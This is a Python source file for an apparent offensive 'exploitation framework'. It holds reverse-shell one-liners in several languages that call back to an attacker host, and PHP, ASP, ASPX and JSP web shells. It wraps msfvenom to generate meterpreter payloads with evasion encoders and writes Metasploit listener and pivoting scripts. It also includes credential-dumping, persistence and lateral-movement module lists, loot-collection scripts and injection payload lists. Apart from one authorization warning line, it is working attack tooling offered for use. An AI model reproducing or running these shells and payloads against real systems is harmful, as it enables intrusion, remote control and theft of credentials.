#!/usr/bin/env python3
"""
HydraRecon Advanced Exploitation Framework
████████████████████████████████████████████████████████████████████████████████
█  AUTOMATED EXPLOITATION ENGINE - Intelligent Payload Generation & Delivery   █
████████████████████████████████████████████████████████████████████████████████
"""

import asyncio
import subprocess
import os
import json
import tempfile
import base64
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from enum import Enum
import socket
import struct


class PayloadType(Enum):
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    METERPRETER = "meterpreter"
    WEB_SHELL = "web_shell"
    COMMAND_EXEC = "command_exec"


class PayloadFormat(Enum):
    RAW = "raw"
    EXE = "exe"
    ELF = "elf"
    DLL = "dll"
    PYTHON = "python"
    POWERSHELL = "powershell"
    BASH = "bash"
    PHP = "php"
    ASPX = "aspx"
    JSP = "jsp"
    WAR = "war"


class Architecture(Enum):
    X86 = "x86"
    X64 = "x64"
    ARM = "arm"
    ARM64 = "arm64"


class OperatingSystem(Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    BSD = "bsd"
    ANDROID = "android"


@dataclass
class PayloadConfig:
    """Payload configuration"""
    payload_type: PayloadType
    format: PayloadFormat
    os: OperatingSystem
    arch: Architecture
    lhost: str
    lport: int
    encoder: Optional[str] = None
    iterations: int = 1
    bad_chars: str = ""
    prepend_nops: int = 0
    custom_options: Dict[str, Any] = field(default_factory=dict)


@dataclass
class GeneratedPayload:
    """Generated payload with metadata"""
    payload_type: PayloadType
    format: PayloadFormat
    data: bytes
    size: int
    hash_md5: str
    hash_sha256: str
    generated_at: datetime
    config: PayloadConfig
    detection_rate: Optional[float] = None
    notes: str = ""


class PayloadGenerator:
    """
    Advanced payload generation engine
    Supports multiple frameworks and custom payloads
    """
    
    # Common reverse shell templates
    SHELL_TEMPLATES = {
        "bash_tcp": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_udp": "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "python_tcp": '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
        "python3_tcp": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
        "perl_tcp": '''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
        "php_tcp": '''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
        "ruby_tcp": '''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
        "nc_tcp": "nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "powershell_tcp": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
        "powershell_encoded": '''powershell -e {encoded}''',
    }
    
    # Web shell templates
    WEB_SHELLS = {
        "php_simple": '''<?php system($_GET['cmd']); ?>''',
        "php_eval": '''<?php eval($_POST['c']); ?>''',
        "php_full": '''<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
} else {
    echo "<form method='post'><input type='text' name='cmd'/><input type='submit'/></form>";
}
?>''',
        "asp_simple": '''<%eval request("cmd")%>''',
        "aspx_simple": '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object s, EventArgs e){
    if(Request["cmd"]!=null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write(p.StandardOutput.ReadToEnd());
    }
}
</script>''',
        "jsp_simple": '''<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String dirone = dis.readLine();
    while(dirone != null){
        out.println(dirone);
        dirone = dis.readLine();
    }
}
%>''',
    }
    
    def __init__(self, config=None):
        self.config = config
        self.msfvenom_path = self._find_msfvenom()
        self.generated_payloads = []
    
    def _find_msfvenom(self) -> Optional[str]:
        """Find msfvenom binary"""
        paths = [
            "/usr/bin/msfvenom",
            "/usr/local/bin/msfvenom",
            "/opt/metasploit-framework/bin/msfvenom",
            "/opt/metasploit/bin/msfvenom",
        ]
        for path in paths:
            if os.path.exists(path):
                return path
        return None
    
    def generate_reverse_shell(self, lhost: str, lport: int, 
                               shell_type: str = "bash_tcp") -> str:
        """Generate a reverse shell one-liner"""
        if shell_type not in self.SHELL_TEMPLATES:
            raise ValueError(f"Unknown shell type: {shell_type}")
        
        template = self.SHELL_TEMPLATES[shell_type]
        return template.format(lhost=lhost, lport=lport)
    
    def generate_web_shell(self, shell_type: str = "php_simple") -> str:
        """Generate a web shell"""
        if shell_type not in self.WEB_SHELLS:
            raise ValueError(f"Unknown web shell type: {shell_type}")
        return self.WEB_SHELLS[shell_type]
    
    def generate_powershell_encoded(self, command: str) -> str:
        """Generate base64 encoded PowerShell command"""
        encoded = base64.b64encode(command.encode('utf-16-le')).decode()
        return f"powershell -e {encoded}"
    
    async def generate_msfvenom_payload(self, config: PayloadConfig) -> Optional[GeneratedPayload]:
        """Generate payload using msfvenom"""
        if not self.msfvenom_path:
            return None
        
        # Map configuration to msfvenom arguments
        payload_map = {
            (PayloadType.REVERSE_SHELL, OperatingSystem.LINUX, Architecture.X64): "linux/x64/shell_reverse_tcp",
            (PayloadType.REVERSE_SHELL, OperatingSystem.LINUX, Architecture.X86): "linux/x86/shell_reverse_tcp",
            (PayloadType.REVERSE_SHELL, OperatingSystem.WINDOWS, Architecture.X64): "windows/x64/shell_reverse_tcp",
            (PayloadType.REVERSE_SHELL, OperatingSystem.WINDOWS, Architecture.X86): "windows/shell_reverse_tcp",
            (PayloadType.METERPRETER, OperatingSystem.LINUX, Architecture.X64): "linux/x64/meterpreter_reverse_tcp",
            (PayloadType.METERPRETER, OperatingSystem.LINUX, Architecture.X86): "linux/x86/meterpreter_reverse_tcp",
            (PayloadType.METERPRETER, OperatingSystem.WINDOWS, Architecture.X64): "windows/x64/meterpreter_reverse_tcp",
            (PayloadType.METERPRETER, OperatingSystem.WINDOWS, Architecture.X86): "windows/meterpreter_reverse_tcp",
        }
        
        format_map = {
            PayloadFormat.RAW: "raw",
            PayloadFormat.EXE: "exe",
            PayloadFormat.ELF: "elf",
            PayloadFormat.DLL: "dll",
            PayloadFormat.PYTHON: "python",
            PayloadFormat.POWERSHELL: "psh",
            PayloadFormat.BASH: "bash",
        }
        
        payload_name = payload_map.get((config.payload_type, config.os, config.arch))
        if not payload_name:
            return None
        
        # Build command
        cmd = [
            self.msfvenom_path,
            "-p", payload_name,
            f"LHOST={config.lhost}",
            f"LPORT={config.lport}",
            "-f", format_map.get(config.format, "raw"),
        ]
        
        if config.encoder:
            cmd.extend(["-e", config.encoder])
        if config.iterations > 1:
            cmd.extend(["-i", str(config.iterations)])
        if config.bad_chars:
            cmd.extend(["-b", config.bad_chars])
        
        try:
            result = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await result.communicate()
            
            if result.returncode == 0 and stdout:
                import hashlib
                payload = GeneratedPayload(
                    payload_type=config.payload_type,
                    format=config.format,
                    data=stdout,
                    size=len(stdout),
                    hash_md5=hashlib.md5(stdout).hexdigest(),
                    hash_sha256=hashlib.sha256(stdout).hexdigest(),
                    generated_at=datetime.now(),
                    config=config
                )
                self.generated_payloads.append(payload)
                return payload
        except Exception as e:
            print(f"Error generating payload: {e}")
        
        return None
    
    def get_all_shell_types(self) -> List[str]:
        """Get all available shell types"""
        return list(self.SHELL_TEMPLATES.keys())
    
    def get_all_webshell_types(self) -> List[str]:
        """Get all available web shell types"""
        return list(self.WEB_SHELLS.keys())


class ExploitFramework:
    """
    Exploit framework integration
    Supports Metasploit, custom exploits, and automated exploitation
    """
    
    def __init__(self, config=None):
        self.config = config
        self.msfrpc_client = None
        self.payload_generator = PayloadGenerator(config)
        self.active_sessions = {}
    
    async def check_metasploit_available(self) -> bool:
        """Check if Metasploit is available"""
        try:
            result = await asyncio.create_subprocess_exec(
                "msfconsole", "-v",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await result.communicate()
            return result.returncode == 0
        except:
            return False
    
    def generate_resource_script(self, exploits: List[Dict]) -> str:
        """Generate Metasploit resource script for automated exploitation"""
        lines = [
            "# HydraRecon Auto-Generated Resource Script",
            f"# Generated: {datetime.now().isoformat()}",
            "# WARNING: Only use on authorized targets!",
            "",
            "# Global settings",
            "setg RHOSTS <TARGET_RANGE>",
            "setg LHOST <YOUR_IP>",
            "setg LPORT 4444",
            "",
        ]
        
        for i, exploit in enumerate(exploits):
            lines.append(f"# Exploit {i+1}: {exploit.get('name', 'Unknown')}")
            lines.append(f"use {exploit.get('module', '')}")
            
            for opt, val in exploit.get('options', {}).items():
                lines.append(f"set {opt} {val}")
            
            if exploit.get('payload'):
                lines.append(f"set PAYLOAD {exploit['payload']}")
            
            lines.append("exploit -j")
            lines.append("")
        
        return "\n".join(lines)
    
    def generate_listener_script(self, lhost: str, lport: int, 
                                 payload: str = "windows/x64/meterpreter/reverse_tcp") -> str:
        """Generate multi-handler listener script"""
        return f"""# HydraRecon Multi-Handler Listener
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
    
    def generate_pivoting_script(self, session_id: int, subnet: str) -> str:
        """Generate pivoting/routing script"""
        return f"""# Pivot through session {session_id}
# Add route for internal network
route add {subnet} {session_id}

# Or use autoroute
use post/multi/manage/autoroute
set SESSION {session_id}
set SUBNET {subnet.split('/')[0]}
set NETMASK 255.255.255.0
run

# Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j
"""


class PostExploitation:
    """
    Post-exploitation automation
    Credential harvesting, persistence, lateral movement
    """
    
    # Post-exploitation modules
    POST_MODULES = {
        "credential_dump": {
            "windows": [
                "post/windows/gather/credentials/credential_collector",
                "post/windows/gather/hashdump",
                "post/windows/gather/smart_hashdump",
                "post/windows/gather/lsa_secrets",
                "post/windows/gather/cachedump",
            ],
            "linux": [
                "post/linux/gather/hashdump",
                "post/linux/gather/ecryptfs_creds",
                "post/linux/gather/enum_users_history",
            ]
        },
        "persistence": {
            "windows": [
                "exploit/windows/local/persistence",
                "exploit/windows/local/registry_persistence",
                "exploit/windows/local/s4u_persistence",
            ],
            "linux": [
                "exploit/linux/local/cron_persistence",
                "exploit/linux/local/service_persistence",
            ]
        },
        "privilege_escalation": {
            "windows": [
                "post/multi/recon/local_exploit_suggester",
                "exploit/windows/local/bypassuac",
                "exploit/windows/local/bypassuac_fodhelper",
                "exploit/windows/local/ms16_032_secondary_logon_handle_privesc",
            ],
            "linux": [
                "post/multi/recon/local_exploit_suggester",
                "exploit/linux/local/sudo_baron_samedit",
                "exploit/linux/local/pkexec",
            ]
        },
        "lateral_movement": {
            "windows": [
                "exploit/windows/smb/psexec",
                "exploit/windows/smb/psexec_psh",
                "auxiliary/admin/smb/psexec_command",
            ],
            "linux": [
                "auxiliary/scanner/ssh/ssh_login",
            ]
        }
    }
    
    def __init__(self):
        self.session_data = {}
    
    def get_modules_for_phase(self, phase: str, os_type: str = "windows") -> List[str]:
        """Get post-exploitation modules for a specific phase"""
        return self.POST_MODULES.get(phase, {}).get(os_type, [])
    
    def generate_loot_collection_script(self, session_id: int, os_type: str = "windows") -> str:
        """Generate comprehensive loot collection script"""
        if os_type == "windows":
            return f"""# Windows Loot Collection for Session {session_id}
sessions -i {session_id}

# System info
sysinfo
getuid

# Credential collection
run post/windows/gather/credentials/credential_collector
run post/windows/gather/hashdump
run post/windows/gather/smart_hashdump
run post/windows/gather/lsa_secrets

# Browser credentials
run post/multi/gather/firefox_creds
run post/windows/gather/enum_chrome

# Network info
run post/windows/gather/arp_scanner
run post/windows/gather/enum_domain
run post/windows/gather/enum_shares

# Token manipulation
use incognito
list_tokens -u

background
"""
        else:  # Linux
            return f"""# Linux Loot Collection for Session {session_id}
sessions -i {session_id}

# System info
sysinfo
getuid

# Credential collection
run post/linux/gather/hashdump
run post/linux/gather/enum_users_history

# SSH keys
run post/linux/gather/enum_system

# Network info
run post/linux/gather/enum_network

background
"""


class VulnerabilityScanner:
    """
    Advanced vulnerability scanning beyond basic port scans
    Includes web app scanning, API testing, and cloud enumeration
    """
    
    # Web vulnerability checks
    WEB_CHECKS = [
        {
            "name": "SQL Injection",
            "payloads": ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1; DROP TABLE users--"],
            "indicators": ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLSTATE"]
        },
        {
            "name": "XSS",
            "payloads": ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"],
            "indicators": ["<script>", "alert("]
        },
        {
            "name": "LFI",
            "payloads": ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd%00"],
            "indicators": ["root:x:0:0", "daemon:", "bin:"]
        },
        {
            "name": "Command Injection",
            "payloads": ["; id", "| id", "& id", "`id`", "$(id)"],
            "indicators": ["uid=", "gid=", "groups="]
        },
        {
            "name": "SSRF",
            "payloads": ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22"],
            "indicators": ["ami-id", "instance-id", "SSH-"]
        },
    ]
    
    # Common API endpoints to test
    API_ENDPOINTS = [
        "/api/v1/users",
        "/api/v1/admin",
        "/api/users",
        "/api/config",
        "/api/debug",
        "/api/swagger.json",
        "/api/docs",
        "/graphql",
        "/graphiql",
        "/.well-known/openid-configuration",
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/metrics",
        "/debug/vars",
    ]
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws": "http://169.254.169.254/latest/meta-data/",
        "gcp": "http://metadata.google.internal/computeMetadata/v1/",
        "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "digitalocean": "http://169.254.169.254/metadata/v1/",
    }
    
    def __init__(self, config=None):
        self.config = config
    
    async def web_vuln_scan(self, url: str, check_type: str = None) -> List[Dict]:
        """Scan for web vulnerabilities"""
        findings = []
        
        checks = self.WEB_CHECKS
        if check_type:
            checks = [c for c in checks if c["name"].lower() == check_type.lower()]
        
        # Implementation would make actual HTTP requests
        # This is a framework showing the capability
        
        return findings
    
    async def api_discovery(self, base_url: str) -> List[Dict]:
        """Discover API endpoints"""
        discovered = []
        
        for endpoint in self.API_ENDPOINTS:
            # Would make actual HTTP requests
            discovered.append({
                "endpoint": f"{base_url}{endpoint}",
                "status": "to_check"
            })
        
        return discovered
    
    async def cloud_metadata_check(self, cloud_provider: str = None) -> Dict:
        """Check for cloud metadata access (SSRF indicator)"""
        results = {}
        
        endpoints = self.CLOUD_METADATA
        if cloud_provider:
            endpoints = {cloud_provider: self.CLOUD_METADATA.get(cloud_provider)}
        
        # Would make actual requests in implementation
        return results
